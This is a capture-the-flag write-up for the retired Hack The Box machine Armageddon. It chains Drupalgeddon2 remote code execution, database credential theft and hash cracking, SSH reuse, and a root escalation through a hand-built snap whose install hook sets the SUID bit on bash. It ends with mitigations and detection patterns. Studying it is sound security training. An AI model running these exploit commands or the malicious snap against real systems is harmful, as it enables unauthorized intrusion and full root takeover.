---
machine: Armageddon
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, drupal, cve, sudo, snap]
---

# Armageddon — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

CentOS with Apache and Drupal 7.56. The version is confirmed in `CHANGELOG.txt` and falls to Drupalgeddon2 (CVE-2018-7600), an unauthenticated RCE. From there `settings.php` leaks MySQL credentials, the user table gives a Drupal admin hash, and cracking that PHPass hash gets SSH. Privilege escalation is a `sudo snap install *` rule that allows installing a hand-made snap whose hook runs as root.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.4 (protocol 2.0)
80/tcp  http  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

The generator header and `robots.txt` give away Drupal; `CHANGELOG.txt` gives the exact version:

```bash
curl -s http://<IP>/CHANGELOG.txt | head -5
# Drupal 7.56, 2017-06-21
```

Drupal 7.56 sits inside CVE-2018-7600 (fixed in 7.58).

## Enumeration

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Usual paths: `/CHANGELOG.txt`, `/README.txt`, `/sites/default/settings.php` (not directly downloadable), `/user/login`, `/admin`.

With the RCE, read the settings file:

```bash
python3 drupa7-CVE-2018-7600.py http://<IP>/ -c "cat /var/www/html/sites/default/settings.php"
```

Inside, `$databases['default']['default']` holds the MySQL user and password. Another route is querying the users table directly:

```bash
python3 drupa7-CVE-2018-7600.py http://<IP>/ -c \
  "mysql -u drupaluser -p'<dbpass>' -e 'select name,pass from drupal.users'"
```

```text
brucetherealadmin  $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

`$S$` is Drupal 7 PHPass; john handles it:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Foothold

```bash
ssh brucetherealadmin@<IP>
# password: <password>
```

If the firewall blocks a reverse shell, that is not a blocker: the RCE can read files and run queries, which is all it takes to reach credentials. The interactive shell comes from SSH with the reused password.

## Escalation

```bash
sudo -l
```

```text
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

The wildcard allows installing an arbitrary snap. A snap is a squashfs image with metadata and hooks; the `install` hook runs as root during installation:

The target is CentOS 7 with no `snapcraft`, no `fpm` and no Internet access: build the package **on the attacker box** and copy it over.

```bash
mkdir -p /tmp/pwn/meta/hooks
cat > /tmp/pwn/meta/snap.yaml <<'EOF'
name: pwn
version: "1.0"
summary: pwn
description: pwn
architectures: [amd64]
confinement: devmode
grade: devel
EOF
cat > /tmp/pwn/meta/hooks/install <<'EOF'
#!/bin/sh
chmod +s /bin/bash
EOF
chmod +x /tmp/pwn/meta/hooks/install
snapcraft pack /tmp/pwn     # or: mksquashfs /tmp/pwn /tmp/pwn_1.0_amd64.snap -noappend
```

```bash
scp /tmp/pwn_1.0_amd64.snap brucetherealadmin@<IP>:/tmp/
sudo snap install /tmp/pwn_1.0_amd64.snap --dangerous --devmode
/bin/bash -p
```

`--dangerous` skips signature checks and `--devmode` disables confinement, neither of which the sudo wildcard restricts.

## Evidence

- `id` → `uid=0(root)` after `/bin/bash -p`.
- `cat /root/root.txt` (redacted).
- `snap list` showing the installed package.

## Lessons learned

- `CHANGELOG.txt` and `README.txt` are the fastest way to pin a CMS version; without a version there is no CVE.
- A non-interactive RCE still works: reading configuration and running SQL is enough to reach credentials.
- Snap hooks run as root by design; allowing `snap install *` with sudo is equivalent to handing over root.
- PHPass is slow but rockyou still breaks it; it is not real protection.
- The database password was reused for SSH: two separate mistakes chained together.

## Mitigations and detection

- Patch Drupal (7.58 fixes CVE-2018-7600; the 7 branch is EOL, migrate to 10/11).
- Keep `settings.php` credentials out of the web user's reach and never reuse them.
- Restrict sudo to exact commands, never wildcards: unrestricted `snap install` is root.
- Disable `--dangerous`/`--devmode` in production and sign snaps.
- Detection: requests to `/?q=user/password&name[%23post_render][]=...` (Drupalgeddon2 pattern), snaps installed from outside the store, hooks touching `sudoers` or SUID bits.
- MITRE: T1190, T1059.004, T1548.003.

## References

- CVE-2018-7600 (Drupalgeddon2).
- snapcraft documentation on hooks.
- MITRE ATT&CK: T1190, T1548.003.
